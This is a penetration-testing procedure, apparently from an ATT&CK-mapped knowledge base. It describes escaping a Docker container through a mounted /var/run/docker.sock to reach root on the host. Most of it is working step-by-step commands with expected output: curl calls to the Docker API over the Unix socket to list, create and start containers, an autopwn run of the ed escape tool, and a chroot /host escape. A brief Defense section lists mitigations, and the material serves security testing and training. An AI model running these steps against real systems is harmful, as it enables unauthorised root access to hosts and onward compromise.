---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:16.928260+00:00'
updated_at: '2023-04-10T20:33:49.692989+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Container Administration Command|T1609 - Container
    Administration Command]]
  - >-
    [[techniques/Modify Cloud Compute Infrastructure|T1578 - Modify Cloud
    Compute Infrastructure]]
sub_techniques:
  - '[[sub-techniques/Create Cloud Instance|T1578.002 - Create Cloud Instance]]'
  - '[[sub-techniques/Create Snapshot|T1578.001 - Create Snapshot]]'
tags:
  - '[[tags/Container - Docker Pentest]]'
  - '[[tags/Mounted Docker Socket]]'
  - container-escape
  - privilege-escalation
commands:
  - '[[commands/check-docker-socket-presence]]'
  - '[[commands/list-docker-containers-via-socket]]'
  - '[[commands/create-nginx-container-via-socket]]'
  - '[[commands/start-docker-container-via-socket]]'
  - '[[commands/hunt-sockets-with-ed-tool]]'
  - '[[commands/perform-chroot-escape]]'
platforms:
  - Linux
  - Docker
tools:
  - '[[tools/ed-container-escape]]'
validated: true
---

# Escape-Container-Using-Mounted-Docker-Socket

## Summary

This procedure exploits a misconfigured Docker container where the host's Docker socket (/var/run/docker.sock) is mounted as a volume, allowing an attacker with access to the container to interact with the Docker daemon on the host. By using API calls via curl, the attacker can manage containers (list, create, start), demonstrating control over the host's Docker environment. The procedure culminates in using a specialized escape tool to pivot from the container to a root shell on the host system, achieving privilege escalation.

## Description

In a typical attack scenario, an attacker gains initial foothold in a low-privilege Docker container through a vulnerability like an exposed service or weak credentials. Upon inspection, they discover the Docker socket mounted, which provides unauthorized access to the host's Docker daemon. This allows execution of Docker commands without needing the docker binary, as the socket acts as a client-daemon interface. The attacker can then create or manipulate containers to expand influence, but the primary goal is container escape to the host for broader lateral movement. This technique targets Linux-based Docker environments and relies on the socket's default permissions (accessible to root and docker group). Success leads to root access on the host, enabling persistence, data exfiltration, or further network compromise. The procedure assumes the container runs as non-root but has write access to the socket.

## Requirements

1. Initial access to a running Docker container with /var/run/docker.sock mounted from the host (common misconfiguration in development or insecure deployments).
2. curl installed in the container for API interactions (standard in most images).
3. ed_linux_amd64 binary downloaded and executable in the container's working directory for automated escape.
4. Network isolation may limit external downloads; pre-stage the ed tool if possible.

## Defense

- Avoid mounting /var/run/docker.sock in containers; use API authentication or Kubernetes secrets for orchestration.
- Run containers with user namespaces enabled to isolate UID 0 in the container from host root.
- Implement seccomp profiles and AppArmor/SELinux to restrict socket access and syscalls like chroot.
- Monitor Docker daemon logs (dockerd) for unauthorized API calls from container IPs and audit container volume mounts.
- Use tools like Falco or Sysdig for runtime container security to alert on socket exploitation attempts.

## Objectives

1. Confirm exposure of the Docker socket within the container to assess misconfiguration.
2. Demonstrate control over the host Docker daemon by managing containers.
3. Achieve container escape to obtain root privileges on the underlying host system.
4. Evaluate the potential for lateral movement and persistence post-escape.

## Instructions

### Step 1: Verify Docker Socket Presence

**Context**: Begin by confirming the Docker socket file is mounted and accessible in the container's filesystem. This step validates the vulnerability without triggering API calls.

**Command** ([[commands/check-docker-socket-presence]]):
```bash
ls -la /var/run/docker.sock
```

> This command lists the socket file's details. It should appear as a socket (s in permissions) owned by root:docker. If missing or inaccessible, the exploit path is unavailable; consider alternative escapes.

**Expected Output**: File listing showing srw-rw---- 1 root docker 0 [date] /var/run/docker.sock. Permission denied indicates insufficient access; escalate within container first.

### Step 2: List Running Containers

**Context**: Test connectivity to the Docker daemon by querying the API for running containers. Success confirms the socket allows daemon interaction, providing visibility into the host's container environment.

**Command** ([[commands/list-docker-containers-via-socket]]):
```bash
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
```

> This sends a GET request via the Unix socket to the /containers/json endpoint. Parse the JSON response to identify other containers for potential pivoting.

**Expected Output**: JSON array of container objects, e.g., {"Id":"abc123","Names":["/app-container"],...}. An empty array is valid if no containers run; errors like "permission denied" mean socket access is restricted.

### Step 3: Create a New Container

**Context**: Demonstrate daemon control by creating a new container instance. This simulates malicious activity like deploying a backdoor container and reveals the attacker's ability to modify the host environment.

**Command** ([[commands/create-nginx-container-via-socket]]):
```bash
curl -XPOST --unix-socket /var/run/docker.sock -d '{"Image":"$_IMAGE"}' -H 'Content-Type: application/json' http://localhost/containers/create
```

> Use POST to /containers/create with JSON payload specifying the image. Capture the returned ID for starting the container. If creation fails, check image availability on host.

**Expected Output**: JSON response with {"Id":"def456",...}. Note the Id field; substitute into the next step. 404 or 500 errors indicate daemon issues.

### Step 4: Start the Created Container

**Context**: Activate the newly created container to confirm full lifecycle control. This step verifies the attacker can execute host resources via Docker.

**Command** ([[commands/start-docker-container-via-socket]]):
```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$_CONTAINER_ID/start
```

> POST to /containers/{ID}/start. No body needed; the daemon pulls and runs the image if necessary. Monitor host resources for the new container.

**Expected Output**: 200 OK response or empty body on success. 404 if ID invalid; 500 if image pull fails.

### Step 5: Hunt and Autopwn Sockets for Escape

**Context**: Leverage the ed tool to scan for exploitable Unix sockets (including Docker) and automatically execute the escape. This automates privilege escalation by mounting host filesystems and chrooting.

**Command** ([[commands/hunt-sockets-with-ed-tool]]):
```bash
./ed_linux_amd64 -path=/var/run/ -autopwn=true
```

> Run the binary to hunt sockets starting from /var/run/. On detecting docker.sock, it connects via API, creates a pivot container if needed, and escapes. If autopwn fails, fall back to manual API calls.

**Expected Output**: Log messages like [+] Hunting Down UNIX Domain Sockets... [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn... then escape prompts like chroot /host && clear, followed by root shell (id shows uid=0(root)).

### Step 6: Perform Manual Chroot Escape

**Context**: If autopwn partially succeeds or for manual verification, execute chroot to switch to the host filesystem. This finalizes the escape, providing a persistent root shell.

**Command** ([[commands/perform-chroot-escape]]):
```bash
chroot /host && clear
echo 'You are now on the underlying host'
```

> The ed tool typically runs this; execute manually post-pivot. Verify with id or whoami. If /host not mounted, use Docker API to mount hostfs first.

**Expected Output**: Cleared terminal with echo message, then host prompt. id command: uid=0(root) gid=0(root) groups=0(root),... confirming root access.
